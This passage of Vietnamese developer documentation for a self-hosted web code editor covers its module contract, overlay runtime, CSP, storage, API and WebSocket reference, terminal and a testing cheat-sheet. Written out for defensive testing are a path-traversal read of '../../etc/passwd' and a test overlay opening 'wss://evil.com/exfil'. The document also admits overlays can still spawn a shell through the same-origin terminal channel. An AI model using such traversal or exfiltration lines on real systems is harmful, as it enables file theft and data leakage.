  → chạy cleanup LIFO
  → xóa <script> (và <link> nếu full unload)
  → không còn leak
```

---

5. Module Contract

5.1. init.txt — Metadata (JSON)

```json
{
  "name": "my_module",
  "version": "1.0.0",
  "description": "Mô tả ngắn",
  "critical": false,
  "module_storage_quota": 134217728,
  "routes": [
    { "method": "GET",  "path": "/api/my_module/hello", "handler": "hello" }
  ],
  "ui_buttons": [
    {
      "id": "ping",
      "label": "Ping",
      "icon": "📡",
      "color": "info",
      "action": "custom"
    }
  ],
  "settings_schema": {
    "enabled": { "type": "boolean", "default": true, "label": "Enable" },
    "threshold": { "type": "number", "default": 10, "min": 1, "max": 100 }
  },
  "diagnostics": { "files": ["*.py", "*.js"] }
}
```

Trường Bắt buộc Ý nghĩa
name ✅ Tên module (unique, không có /, ..)
version ✅ Semver
description — Mô tả hiển thị trong Settings UI
critical — Nếu true → engine fail-fast khi load fail (v2.0.1 — C3)
module_storage_quota — Override quota (bytes). Mặc định config.module_storage_quota
routes[] — Endpoint module tự khai báo
ui_buttons[] — Nút hiển thị trong tab Modules
settings_schema — Schema để render UI settings
diagnostics.files — Glob file cần chạy diagnose()

5.2. main.py — Class Module

```python
from core.loader import ModuleBase

class Module(ModuleBase):
    # Lifecycle
    def on_load(self): pass
    def on_recovery(self): pass
    def on_shutdown(self): pass

    # Settings
    def on_settings_changed(self, new_settings): pass
    def get_settings(self) -> dict: ...

    # Diagnostics (v2.0.1: có timeout 5s tự động)
    def diagnose(self, project, path, content) -> list[dict]:
        return []

    # Error interceptors
    def on_any_error(self, ctx) -> dict | None: return None
    def on_http_error(self, ctx) -> dict | None: return None
    def on_ws_route_error(self, ctx) -> dict | None: return None
    def on_ws_action_error(self, ctx) -> dict | None: return None

    # Routes (declared in init.txt)
    def hello(self, req) -> dict:
        return {"ok": True, "msg": "Hello"}

    # UI button handlers (on_button_<id>)
    def on_button_ping(self, params) -> dict:
        return {"ok": True, "pong": True}
```

5.3. Diagnostic shape

```python
{
    "severity":   "error" | "warning" | "info" | "hint",
    "line":       1,          # bắt buộc (1-indexed)
    "column":     1,
    "end_line":   1,
    "end_column": 5,
    "message":    "Mô tả lỗi",
    "code":       "MY001",
}
```

5.4. Error interceptor return shape

```python
return None                                        # pass through
return {"handled": False}                          # pass through
return {"handled": True, "response": {...}}        # handled
return {"ok": False, "error": "..."}               # handled (dùng luôn)
```

5.5. Overlay CSS/JS — web/ vs data/

Vị trí Dùng khi URL
web/overlay.css File nhỏ (< 50 KB) /module/<name>/overlay.css
web/overlay.js File nhỏ /module/<name>/overlay.js
data/overlay.css File lớn (bundle, vendor) /module/<name>/_data_/overlay.css
data/overlay.js File lớn /module/<name>/_data_/overlay.js

Thứ tự ưu tiên: data/ trước, rồi fallback web/.

Namespace bắt buộc (loader warn nếu thiếu — v2.0.1 M11 thêm cảnh báo file missing):

```css
/* ❌ SAI — phá core */
.toolbar { background: red; }

/* ✅ ĐÚNG */
.acdv-my_module-toolbar { background: red; }
/* hoặc */
[data-module="my_module"] .toolbar { background: red; }
```

5.6. Sandbox

Mỗi module có jail riêng tại modules/<name>/data/:

```python
def my_handler(self, req):
    # ✅ OK
    self.sandbox.write("my_module", "cache.json", '{"x":1}')
    data = self.sandbox.read("my_module", "cache.json")

    # ❌ Raise SandboxViolation
    self.sandbox.read("my_module", "../../etc/passwd")
```

---

6. Overlay Runtime v2.0.1

6.1. Tổng quan

Cơ chế Mô tả Ghi chú v2.0.1
ACDV.register() Module đăng ký init function Record identity check (H12)
Cleanup registry Mọi resource (listener, timer, DOM) được track → tự cleanup khi unload —
ETag-based cache Không bust cache mỗi lần refresh —
App readiness App.whenReady() — overlay không race với App.init() —
CSP connect-src siết Chặn overlay gọi WS ngoài host:port hiện tại C5
WS queue ws.send() không drop khi chưa OPEN —
Safe mode Unload toàn bộ cleanup, không chỉ xóa <script> —
Tắt JS không mất CSS Chỉ dọn script, giữ link C6 — _unloadJsOnly()

6.2. API cho module overlay

```js
// modules/<name>/web/overlay.js
(function (ACDV) {
  'use strict';

  ACDV.register('<name>', function (ctx) {
    // Core refs (lazy getters)
    ctx.app;        // window.App
    ctx.cm;         // CodeMirror instance
    ctx.editor;     // EditorManager
    ctx.ws;         // WSClient
    ctx.settings;   // globalSettings

    // Auto-cleanup helpers
    ctx.cmOn('change', handler);              // → cm.off() khi unload
    ctx.wsOn('run_output', handler);          // → ws.off() khi unload
    ctx.on(document, 'keydown', handler);     // → removeEventListener
    ctx.append(document.body, el);            // → remove DOM
    ctx.timer(fn, 1000);                      // → clearTimeout
    ctx.interval(fn, 3000);                   // → clearInterval
    ctx.onCleanup(customFn);                  // custom cleanup

    // Utilities
    ctx.log('ready');
    await ctx.fetch('/api/modules');          // chỉ same-origin
    ctx.storageGet('key', def);               // localStorage per-module
    ctx.storageSet('key', val);
  });
})(window.ACDV);
```

6.3. Migration từ v1.x

Trước v2.0 (leak pattern):

```js
(function () {
  const editor = App.editor.cm;
  editor.on('inputRead', handler);          // ❌ không bao giờ off
  document.addEventListener('keydown', h);  // ❌ không remove
  setInterval(pollServer, 3000);            // ❌ không clear
  document.body.appendChild(panel);         // ❌ không remove
})();
```

Sau v2.0.1 (cleanup pattern):

```js
(function (ACDV) {
  ACDV.register('my_mod', function (ctx) {
    ctx.cmOn('inputRead', handler);
    ctx.on(document, 'keydown', h);
    ctx.interval(pollServer, 3000);

    const panel = document.createElement('div');
    panel.id = 'acdv-my_mod-panel';           // namespace!
    panel.className = 'acdv-my_mod-panel';
    ctx.append(document.body, panel);

    ctx.log('overlay ready');
  });
})(window.ACDV);
```

Checklist migration:

· ☐ Bọc toàn bộ code trong ACDV.register('name', fn)
· ☐ editor.on(...) → ctx.cmOn(...)
· ☐ ws.on(...) → ctx.wsOn(...)
· ☐ addEventListener(...) → ctx.on(target, ...)
· ☐ setTimeout / setInterval → ctx.timer / ctx.interval
· ☐ document.body.appendChild(el) → ctx.append(document.body, el)
· ☐ document.getElementById(...) → tự sinh id prefix acdv-<name>-
· ☐ CSS class → prefix .acdv-<name>- hoặc wrap [data-module="<name>"]

6.4. Safe mode

3 cách bật:

1. URL: http://localhost:8765/?safe=1
2. Settings UI: Settings → Overlays → Safe mode = ON
3. Banner: click 🛑 Disable khi có overlay active

Khác biệt v1.x vs v2.0.1:

Version Hành vi
v1.x Xóa <script> khỏi DOM — effect vẫn còn (listener, timer, hook fetch)
v2.0.1 Gọi ACDV.unloadAll() — cleanup LIFO, xóa hết listener/timer/DOM

6.5. CSP headers (server-side)

```
Content-Security-Policy: default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
  img-src 'self' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
  font-src 'self' data: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
  connect-src 'self' ws://<host>:<port> wss://<host>:<port>;   ← v2.0.1 SIẾT (C5)
  worker-src 'self' blob:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

Hệ quả cho overlay:

· ✅ Overlay gọi /api/* (same-origin) → OK
· ✅ Overlay kết nối WS tới server hiện tại → OK
· ❌ Overlay gọi https://evil.com/... → CSP block
· ❌ Overlay mở wss://evil.com/exfil → CSP block (v2.0.1 C5)
· ⚠️ Overlay vẫn có thể gửi terminal_open qua WS same-origin → shell thực thi với quyền người dùng (fix v2.1 — iframe sandbox)

6.6. ETag cache flow

```
Lần 1 load trang:
  GET /module/code_suggest/overlay.js?v=<etag1>
  ← 200 + ETag: <etag1> + Cache-Control: no-cache

F5 reload (không đổi file):
  ← 304 Not Modified (không body)

Sửa file + reload module:
  POST /api/modules/reload {name:"code_suggest"}
  → loader._enrich_overlay_meta() → etag mới
  GET /api/overlay → { js_etag: "<etag2>" }
  Client thấy etag khác → inject URL mới
  ← 200 + body mới
```

ETag = {mtime_ns:x}-{size:x} — deterministic, không cần restart server.

6.7. Uninstall ghost (đã fix từ v2.0.0, giữ nguyên v2.0.1)

· v1.x: Uninstall module → thư mục bị xóa, nhưng overlay.js đã inject vẫn chạy, vẫn ws.send() → server trả "module not loaded" mỗi vài giây.
· v2.0.1: WS broadcast modules_changed → App gọi OverlayLoader.refresh() → thấy module không còn trong /api/overlay → ACDV.unload(name) → cleanup hết.

---

7. Multi-language Editing

Core hỗ trợ chỉnh sửa và lưu trữ ~50 ngôn ngữ. Ngôn ngữ không có trong bảng được lưu dạng plaintext.

7.1. Nguyên tắc "Edit ≠ Run"

```
┌─────────────────────────────────────────────────┐
│  EDIT (core)                                    │
│  ─ CodeMirror syntax highlight ~50 languages    │
│  ─ Save = plaintext UTF-8                       │
│  ─ Không phụ thuộc compiler                     │
├─────────────────────────────────────────────────┤
│  RUN (core — giới hạn)                          │
│  ─ .py   → sys.executable -u                    │
│  ─ .js   → node                                 │
│  ─ .sh   → bash                                 │
│  ─ .bash → bash                                 │
├─────────────────────────────────────────────────┤
│  RUN (module — mở rộng)                         │
│  ─ java, c, cpp, go, rust, php, ruby, …         │
│  ─ Module tự pkg install                        │
│  ─ Module tự spawn compiler                     │
│  ─ Module tự stream output qua engine._broadcast│
└─────────────────────────────────────────────────┘
```

7.2. Bảng ngôn ngữ

Nhóm Extension Compile core?
Python .py .pyw .pyi ✅
JavaScript .js .mjs .cjs .jsx ✅
Shell .sh .bash .zsh .ksh .fish ✅
HTML / CSS / JSON / XML / YAML / TOML tương ứng ❌ (edit-only)
Markdown .md .markdown ❌
Dockerfile dockerfile, containerfile ❌
SQL .sql ❌
TypeScript .ts .tsx ❌ (module lang_ts)
Vue .vue ❌
Pug / Jade .pug .jade ❌
CoffeeScript .coffee ❌
PowerShell .ps1 .psm1 ❌
PHP .php .phtml ❌ (module lang_php)
Ruby .rb .rake .gemspec ❌ (module lang_ruby)
Perl .pl .pm ❌
Lua .lua ❌
R .r .rmd ❌
C .c .h ❌ (module lang_gcc)
C++ .cpp .cc .cxx .hpp ❌ (module lang_gcc)
Objective-C .m .mm ❌
Java .java ❌ (module lang_java)
Kotlin .kt .kts ❌ (module lang_kotlin)
C# .cs ❌
Scala .scala .sc ❌
Dart .dart ❌
Swift .swift ❌
Go .go ❌ (module lang_go)
Rust .rs ❌ (module lang_rust)
Clojure .clj .cljs .edn ❌
Haskell .hs .lhs ❌

7.3. Ví dụ: module lang_java (~150 dòng)

```python
# modules/lang_java/main.py
import os
import subprocess
import shutil
import tempfile
import threading
from core.loader import ModuleBase


class Module(ModuleBase):
    def on_load(self):
        print(f"[{self.name}] Java compiler module loaded")

    def _run_streaming(self, cmd, cwd=None, label=""):
        proc = subprocess.Popen(
            cmd, cwd=cwd,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            bufsize=1, universal_newlines=True,
            encoding="utf-8", errors="replace",
        )
        buffer = []
        for line in proc.stdout:
            buffer.append(line.rstrip("\n"))
            if len(buffer) >= 20:
                self.engine._broadcast({
                    "type": "run_output",
                    "project": "(module)",
                    "path": label,
                    "lines": buffer,
                })
                buffer = []
        if buffer:
            self.engine._broadcast({
                "type": "run_output", "project": "(module)",
                "path": label, "lines": buffer,
            })
        proc.wait()
        return proc.returncode

    def on_button_install_jdk(self, params):
        if shutil.which("javac"):
            return {"ok": True, "already": True}

        def _do():
            code = self._run_streaming(
                ["pkg", "install", "-y", "openjdk-17"],
                label="pkg install openjdk-17"
            )
            self.engine._broadcast({
                "type": "run_finished", "project": "(module)",
                "path": "pkg install openjdk-17", "exit_code": code,
                "log_name": "module_pkg.log",
            })

        threading.Thread(target=_do, daemon=True).start()
        return {"ok": True, "message": "Đang cài JDK qua pkg…"}

    def on_button_compile_run(self, params):
        project = params.get("project")
        path = params.get("path")
        if not project or not path or not path.endswith(".java"):
            return {"ok": False, "error": "Chỉ chạy file .java."}

        if not shutil.which("javac"):
            return {"ok": False, "error": "Bấm 'Install JDK' trước."}

        proj_dir = os.path.join(self.engine.base_dir, "projects", project)
        src = os.path.join(proj_dir, path)
        out_dir = tempfile.mkdtemp(prefix="acdv_java_")

        def _do():
            code = self._run_streaming(
                ["javac", "-d", out_dir, src],
                cwd=proj_dir, label=f"javac {path}",
            )
            if code == 0:
                main_class = os.path.splitext(os.path.basename(path))[0]
                code = self._run_streaming(
                    ["java", "-cp", out_dir, main_class],
                    cwd=proj_dir, label=f"java {main_class}",
                )
            self.engine._broadcast({
                "type": "run_finished", "project": project, "path": path,
                "exit_code": code, "log_name": "java_compile.log",
            })

        threading.Thread(target=_do, daemon=True).start()
        return {"ok": True, "message": "Compile + run đang chạy"}
```

Ngôn ngữ pkg install Compiler Runner
Java openjdk-17 javac -d out Main.java java -cp out Main
C / C++ clang clang main.c -o main ./main
Go golang go build -o main main.go ./main
Rust rust rustc main.rs -o main ./main
PHP php — php index.php
Ruby ruby — ruby main.rb
Kotlin kotlin kotlinc Main.kt -include-runtime -d main.jar java -jar main.jar

---

8. Module Storage

8.1. Vị trí

```
modules/<name>/storage/
├── files/              ← file upload (accessible)
├── .storage.json       ← metadata (auto)
└── .tmp_uploads/       ← chunk tạm (auto cleanup)
```

8.2. Đặc điểm

· Tách biệt hoàn toàn với data/ (sandbox) — dùng cho file người dùng upload.
· Quota mặc định 512 MB (config.module_storage_quota).
· Override per-module: khai báo module_storage_quota trong init.txt.
· Cảnh báo tự động: ≥ 90 % (warn), ≥ 98 % (block upload + broadcast WS).
· Upload chunked: 4 MB/chunk, hỗ trợ tới 200 MB/file.
· Export ZIP: tải toàn bộ storage 1 click.
· Path traversal safe: chống ../ escape.
· v2.0.1: atomic meta write + lock, chunk out-of-order OK, quota re-check lúc assemble.

8.3. Python API

```python
def on_load(self):
    # Quota info
    usage = self.engine.storage.usage(self.name)
    # → {"used": 12345, "quota": 536870912, "percent": 0.0023,
    #    "status": "ok"|"warn"|"full", "free": 536858567}

    # Ghi/đọc file
    self.engine.storage.write_file(self.name, "cache/data.json", '{"x":1}')
    data = self.engine.storage.read_file(self.name, "cache/data.json")

    # List / Delete / Clear / Export
    files = self.engine.storage.list_files(self.name, "")
    self.engine.storage.delete_file(self.name, "cache/data.json")
    self.engine.storage.clear_all(self.name)
    result = self.engine.storage.export_zip(self.name)
```

---

9. API Reference

9.1. Core

Endpoint Method Response
/api/status GET {status, version, boot_id, uptime_modules, system_controls}
/api/boot GET {ok, boot_id, version, modules, storage_quota}
/api/config GET/POST {config, spec...}
/api/modules GET {<name>: metadata} kèm storage_usage
/api/modules/install POST {zip_base64} → {ok, module}
/api/modules/uninstall POST {name}
/api/modules/reload POST {name}
/api/modules/export POST {name} → ZIP base64
/api/overlay GET {safe_mode, overlays:[{name, css_etag, js_etag, css_warning,...}]}
/api/readme GET {content} — đọc wecom.md → README.md (fallback)
/api/settings GET/POST {settings}
/api/settings/modules POST {modules: [...]}
/api/settings/module/get POST {name}
/api/settings/module/set POST {name, values}
/api/diagnostics/check POST {project, path}
/api/diagnostics/all GET {diagnostics: [...]}
/api/terminal/sessions GET {sessions: [...]}
/api/system/restart POST Gated enable_system_controls
/api/system/shutdown POST Gated enable_system_controls

9.2. Module Storage

Endpoint Method Body
/api/modules/storage/usage POST {name}
/api/modules/storage/list POST {name, sub_dir?}
/api/modules/storage/upload_chunk POST {name, path, chunk_index, total_chunks, chunk_b64, total_size, upload_id}
/api/modules/storage/download POST {name, path}
/api/modules/storage/delete POST {name, path}
/api/modules/storage/clear POST {name}
/api/modules/storage/export_zip POST {name, sub_dir?}

9.3. Projects

Endpoint Method Body
/api/projects GET —
/api/projects/create POST {name, language}
/api/projects/upload POST {name, zip_base64}
/api/projects/delete POST {name}
/api/projects/export POST {name}
/api/projects/tree POST {project}
/api/projects/file/read POST {project, path}
/api/projects/file/write POST {project, path, content}
/api/projects/file/create POST {project, path}
/api/projects/file/delete POST {project, path}
/api/projects/file/rename POST {project, old_path, new_path}
/api/projects/folder/create POST {project, path}
/api/projects/run POST Chỉ .py / .js / .sh / .bash
/api/projects/run/stop POST {force?}
/api/projects/run/status GET —
/api/projects/logs/list POST {project?}
/api/projects/logs/read POST {name}
/api/projects/logs/delete POST {name}

9.4. Module static

```
GET /module/<name>/                    → web/index.html
GET /module/<name>/overlay.css         → web/overlay.css
GET /module/<name>/overlay.js          → web/overlay.js
GET /module/<name>/*                   → web/*
GET /module/<name>/_data_/*            → data/*
GET /module/<name>/_storage_/*         → storage/files/*
```

---

10. WebSocket Protocol

10.1. Client → Server

```jsonc
{ "type": "ping", "time": 1234567890 }
{ "type": "status" }
{ "type": "modules" }
{ "type": "settings" }
{ "type": "module_settings", "module": "my_module" }
{ "type": "route", "id": "req-1", "method": "POST", "path": "/api/status", "body": {} }
{ "type": "module_action", "module": "lang_java", "button_id": "compile_run", "params": {"project":"demo","path":"Main.java"} }

// terminal
{ "type": "terminal_open",   "id": "t_abc", "cols": 80, "rows": 24, "cwd": "projects/demo" }
{ "type": "terminal_input",  "id": "t_abc", "data": "ls\r" }
{ "type": "terminal_resize", "id": "t_abc", "cols": 100, "rows": 30 }
{ "type": "terminal_close",  "id": "t_abc" }
```

10.2. Server → Client

```jsonc
{ "type": "pong", "time": 1234567890 }
{ "type": "status", "data": {modules, running, clients, runner, settings, terminals} }
{ "type": "modules", "data": {...} }
{ "type": "settings", "data": {...} }
{ "type": "route_result", "id": "req-1", "ok": true, "data": {...} }
{ "type": "module_action_result", "module": "x", "button_id": "y", "ok": true, "result": {...} }

// Run events
{ "type": "run_started",  "project", "path", "log_name", "pid" }
{ "type": "run_output",   "project", "path", "lines": ["...", "..."] }
{ "type": "run_finished", "project", "path", "exit_code", "log_name" }

// Diagnostics
{ "type": "diagnostics_update",  "project", "path", "diagnostics": [...] }
{ "type": "diagnostics_cleared" }

// Settings (broadcast tới MỌI client để hot-apply)
{ "type": "settings_changed",        "settings": {...} }
{ "type": "module_settings_changed", "module", "values": {...} }

// Module events
{ "type": "modules_changed", "action": "added|removed|reloaded", "module": "..." }

// Project events (v2.0.1 M7, M8)
{ "type": "project_deleted", "project": "..." }
{ "type": "project_file_deleted", "project", "path" }

// Config events (v2.0.1 M9)
{ "type": "config_changed", "config": {...} }

// System controls
{ "type": "system_restarting" }
{ "type": "system_restarted", "boot_id", "version" }
{ "type": "system_shutdown" }

// Storage warning
{ "type": "storage_warning", "module", "usage", "severity": "warning"|"error" }

// Terminal
{ "type": "terminal_opened", "id" }
{ "type": "terminal_output", "id", "data" }
{ "type": "terminal_exit",   "id", "code" }
{ "type": "terminal_error",  "id", "error" }
```

10.3. WSClient methods (v2.0.1)

```js
const ws = new WSClient();
ws.connect();

const unsub = ws.on('run_output', handler);  // trả unsubscribe
ws.off('run_output', handler);                // tắt thủ công
ws.once('run_finished', handler);             // auto off sau 1 lần
ws.send({ type: 'route', ... });              // queue nếu chưa OPEN
ws.removeAll('run_output');                   // xóa tất cả listener của event
```

v2.0.1 tự động gửi ping mỗi 90 giây (heartbeat) để giữ kết nối (fix H4).

---

11. Frontend / Editor

11.1. Editor options mặc định

Option Giá trị Ghi chú
lineWrapping false Đọc từ settings.editor.line_wrap
tabSize 4 Đọc từ settings.editor.tab_size
indentUnit 4 —
inputStyle "contenteditable" trên Android Fix thụt lề + double-input
foldGutter true —
gutters ["CodeMirror-linenumbers", "CodeMirror-foldgutter"] —

11.2. Code folding

Thao tác Cách
Fold tại cursor Ctrl-Q
Fold tất cả Ctrl-Shift-[ hoặc nút ⇕
Unfold tất cả Ctrl-Shift-] hoặc bấm ⇕ lần nữa
Fold riêng 1 block Click ▾ ở gutter bên trái

11.3. Theme hợp lệ (CM5)

dracula, default, material, monokai, solarized, eclipse.

11.4. Settings hot apply

1. Server broadcast settings_changed qua WS mỗi lần POST /api/settings thành công.
2. app.js lắng nghe → editor.onSettingsChanged(newSettings).
3. settings.js chủ động gọi editor.onSettingsChanged() ngay sau save.
4. editor.onSettingsChanged() → applySettings() → cập nhật font_size, tab_size, line_wrap, theme.
5. v2.0.1 (M12): nếu SettingsUI đang mở → reload để đồng bộ input.

---

12. Undo / Redo

12.1. Thao tác

Thao tác Cách
Undo Ctrl+Z / Cmd+Z
Redo Ctrl+Y hoặc Ctrl+Shift+Z
Undo (mobile) Nút ↶ trên toolbar
Redo (mobile) Nút ↷ trên toolbar

12.2. Cơ chế

Per-tab history — mỗi tab giữ một CodeMirror.Doc riêng:

```js
const doc = CodeMirror.Doc(content, mode);
tab.doc = doc;
// Khi chuyển tab:
cm.swapDoc(tab.doc);  // ← KHÔNG dùng setValue + clearHistory
```

Dirty flag chính xác (v2.0.1 — C7):

```js
this.cm.on("change", () => {
  const current = this.cm.getValue();
  const isDirty = current !== tab.content;
  if (tab.dirty !== isDirty) { tab.dirty = isDirty; renderTabs(); }
});
```

12.3. Lưu ý

· Save không clear history — undo về trước save → dấu ● xuất hiện lại.
· Đóng tab → mất history (giống VS Code).
· KHÔNG dùng cm.setValue() khi chuyển tab — sẽ xóa history.
· v2.0.1 (C7): lazy-load mode không reset dirty flag — dấu ● giữ đúng.

---

13. Terminal

13.1. Yêu cầu

· POSIX: dùng PTY (pty.openpty) → hỗ trợ app interactive (vim, top, htop, less, …).
· Windows: fallback pipe (không có PTY, hạn chế app fullscreen).
· Frontend: xterm.js 5.3 + addons fit, web-links (CDN trong index.html).

13.2. Thao tác

Thao tác Cách
Mở/đóng terminal panel Ctrl+`  hoặc nút ⌨
Restart session Nút ⟳ trên header terminal
Kill session Nút 🗑 trên header terminal
Resize Tự động theo panel (FitAddon)
Copy / paste Chuột phải / Shift+Insert (native xterm)

13.3. Bảo mật & giới hạn

· Mỗi session gắn với một WS client — disconnect → auto kill session.
· max_sessions (mặc định 8) — cấu hình trong config.json.
· cwd_hint chỉ cho phép nằm trong base_dir (chống escape).
· Không có sandbox OS-level — terminal có quyền người dùng chạy server. Không chạy bằng sudo.
· v2.0.1 (C4): session tự pop khỏi manager khi process exit — không còn leak.
· v2.0.1 (H4): heartbeat 90 giây giữ kết nối qua proxy/NAT.

13.4. Dùng terminal để cài compiler

```bash
pkg update && pkg install openjdk-17      # Java
pkg install clang                         # C/C++
pkg install golang                        # Go
pkg install rust                          # Rust
pkg install php ruby                      # PHP / Ruby
```

---

14. Export / Import ZIP

14.1. Thao tác

Đối tượng Cách
Project Tab Projects → click ⬇ cạnh tên → tải <name>.zip
Module Tab Modules → click ⬇ cạnh tên → tải <name>.zip
Storage Tab Modules → 💾 → "Export ZIP" → tải <name>_storage.zip

14.2. Nội dung ZIP

Project ZIP (base dir = <name>/):

· ✅ Bao gồm: toàn bộ file trong project.
· ❌ Bỏ qua: .project.json, __pycache__/, *.pyc, .git/, .svn/.

Module ZIP (base dir = <name>/):

· ✅ Bao gồm: main.py, init.txt, web/*, data/*, storage/*, …
· ❌ Bỏ qua: __pycache__/, *.pyc, .git/, .svn/, .tmp_uploads/.

14.3. Round-trip

```
Export ZIP → Uninstall/Delete → Upload lại qua 📤 → Restored 100%
```

---

15. Loading & Restart

15.1. Loading overlay

· Hiện khi App.init() bắt đầu.
· Text cập nhật theo tiến trình: "Tải projects…", "Tải README…", "Tải modules…".
· Tự ẩn sau khi mọi thứ sẵn sàng (~200 ms).
· v2.0.1 (M6): nếu App.init() throw → _showFatal(msg) overlay thay vì loading treo.
· v2.0.1: sau khi ẩn loading → App._markReady() → overlay runtime chạy init functions.

15.2. Restart flow

```
Người dùng click 🔄 Restart (confirm)
  → App._showRestartOverlay()
  → POST /api/system/restart
  → engine._restart_pending = True
  → broadcast {type:"system_restarting"}
  → os.execv(main.py) → process restart
  → boot() hoàn tất
  → broadcast {type:"system_restarted", boot_id}
  → app.js: location.reload() (sau 800ms)
```

15.3. Shutdown flow

```
Người dùng click ⏻ Shutdown (confirm)
  → App.ws.allowReconnect = false
  → POST /api/system/shutdown
  → broadcast {type:"system_shutdown"}
  → engine.shutdown() → os._exit(0)
  → App hiện overlay "Đã tắt"
```

---

16. Dev Workflow

16.1. Thêm route core (protected)

```python
# core/engine.py → _init_core()
A = self.router.add_core          # ← protected route
A("GET", "/api/my_endpoint", self._api_my_endpoint)
```

⚠️ Luôn dùng add_core — nếu dùng router.add, module có thể override.

16.2. Viết overlay v2.0.1 (đúng cách)

```js
// modules/my_mod/web/overlay.js
(function (ACDV) {
  'use strict';

  ACDV.register('my_mod', function (ctx) {
    ctx.cmOn('change', (cm) => {
      const tab = ctx.editor.currentTab();
      if (!tab || !tab.path.endsWith('.py')) return;
      // ... logic Python only ...
    });

    ctx.wsOn('run_finished', (m) => {
      if (m.exit_code !== 0) ctx.warn(`Exit ${m.exit_code}`);
    });

    ctx.on(document, 'keydown', (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        ctx.log('hotkey triggered');
      }
    });

    const panel = document.createElement('div');
    panel.id = 'acdv-my_mod-panel';
    panel.className = 'acdv-my_mod-panel';
    panel.textContent = 'Ready';
    ctx.append(document.body, panel);

    ctx.log('overlay ready');
  });
})(window.ACDV);
```

16.3. Trigger diagnostics từ module

```python
def diagnose(self, project, path, content):
    if not path.endswith(".py"):
        return []
    return [{
        "severity": "warning",
        "line": 1, "column": 1, "end_line": 1, "end_column": 5,
        "message": "Example warning",
        "code": "MY001"
    }]
```

16.4. Intercept errors

```python
def on_http_error(self, ctx):
    if "/api/projects/" not in ctx.get("path", ""):
        return None
    return {
        "ok": False,
        "error": f"Intercepted: {ctx['error']}",
        "custom": True
    }
```

16.5. Override file (dev only)

Đặt .py trong overrides/ → được exec() sau _init_core, trước khi load modules.

```python
# overrides/my_patch.py
def patch(engine, sandbox, config, router):
    print("[patch] applying custom route")
    router.add_core("GET", "/api/dev/debug", lambda req: {"debug": True})
```

16.6. Debug overlay runtime

```js
// DevTools Console
ACDV.status();
// → { version, appReady, safeMode, modules: {...}, injected: {...} }

OverlayLoader.refresh();          // force refresh
OverlayLoader.unload('my_mod');   // unload 1 module
OverlayLoader.unloadAll();        // unload tất cả
```

---

17. Testing Cheat-sheet

17.1. Backend

```bash
# Backend up?
curl http://localhost:8765/api/status
curl http://localhost:8765/api/boot

# Module list
curl http://localhost:8765/api/modules

# Create project (Python)
curl -X POST http://localhost:8765/api/projects/create \
  -H 'Content-Type: application/json' \
  -d '{"name":"demo","language":"python"}'

# Run .py (core OK)
curl -X POST http://localhost:8765/api/projects/run \
  -H 'Content-Type: application/json' \
  -d '{"project":"demo","path":"main.py"}'

# Run .java (fail → hướng dẫn cài module)
curl -X POST http://localhost:8765/api/projects/run \
  -H 'Content-Type: application/json' \
  -d '{"project":"java_demo","path":"Main.java"}'
# Kỳ vọng: {"ok": false, "error": "Core không hỗ trợ chạy/compile '.java'..."}

# Overlay manifest (v2.0.1 có etag)
curl http://localhost:8765/api/overlay
# Kỳ vọng: {ok, safe_mode, overlays: [{..., css_etag, js_etag}]}

# Module storage
curl -X POST http://localhost:8765/api/modules/storage/usage \
  -H 'Content-Type: application/json' -d '{"name":"demo_module"}'
```

17.2. Test Overlay v2.0.1

Test 1 — Cleanup on reload:

```
1. Cài 2 module có overlay
2. DevTools Console: ACDV.status()
   → modules: { code_suggest: { cleanups: 3 }, ai_suggest: { cleanups: 4 } }
3. POST /api/modules/reload {name:"code_suggest"}
4. ACDV.status() lại
   → cleanups KHÔNG tăng (vẫn 3, không phải 6)
5. Gõ trong editor → mỗi ký tự chỉ 1 API call
```

Test 2 — Safe mode thật:

```
1. Có 2 module đang chạy overlay
2. Settings → Overlays → safe_mode = ON → Save
3. Console: ACDV.status().modules → {} (rỗng)
4. Gõ trong editor → KHÔNG có API call nào
5. Bật lại safe_mode = OFF → refresh → modules trở lại
```

Test 3 — Uninstall ghost:

```
1. Cài module "foo" có overlay
2. Tab Modules → Uninstall "foo"
3. Console: ACDV.status().modules.foo → undefined
4. Chờ 10s → không có error toast
5. Gõ trong editor → không có 500
```

Test 4 — CSP block exfil:

```
1. Tạo module test overlay.js:
   fetch('https://httpbin.org/get').catch(e => console.log('BLOCKED:', e.message));
   new WebSocket('wss://evil.com/exfil');   // ← v2.0.1 sẽ block
2. Cài module, xem Console
3. Phải thấy "BLOCKED" do CSP
4. Network tab: request tới httpbin/evil.com không xuất hiện
```

Test 5 — ETag cache:

```
1. Load trang → Network: /module/*/overlay.js?v=abc123
2. F5 reload (không Ctrl+Shift+R)
3. Network: → 304 Not Modified (cache)
4. Sửa overlay.js + reload module
5. Network: /module/*/overlay.js?v=def456 → 200 + body mới
```

Test 6 — Tắt JS không mất CSS (v2.0.1 — C6):

```
1. Cài module có cả CSS + JS overlay
2. Xác nhận CSS đang áp dụng (kiểm tra DOM: <link data-overlay="module_name">)
3. Settings → Overlays → tắt JS của module (giữ CSS)
4. Xác nhận: <script> bị remove, <link> CSS VẪN CÒN trong DOM
5. Refresh → CSS vẫn được inject đúng
```

17.3. Test multi-language edit

```
1. New Project → chọn Java → thấy file Main.java mẫu
2. Mở file → syntax highlighting Java (public, class, void có màu)
3. Sửa vài dòng → Ctrl+S → save OK
4. Mở file .go, .rs, .php, .rb, .kt → mỗi file highlight đúng
5. Bấm ▶ trên file .java → toast lỗi hướng dẫn cài module lang_java
6. Cài module lang_java → "Install JDK" → đợi pkg install
7. Bấm "Compile & Run .java" → output Hello trong panel Run
```

17.4. Test watcher auto-detect (v2.0.1 — C1, C2)

```bash
# Terminal 1: chạy server
python3 main.py

# Terminal 2: test auto-detect
# 1. Copy folder module mới vào modules/
cp -r modules/demo_module modules/test_new
# Đổi tên trong init.txt: "name": "test_new"
# Đợi ≤ 2s → console server in "[Watcher] ⚡ new module detected: test_new"

# 2. Sửa main.py của module
echo "# test edit" >> modules/test_new/main.py
# Đợi ≤ 2s → console in "[Watcher] ⚡ module changed, reloading: test_new"

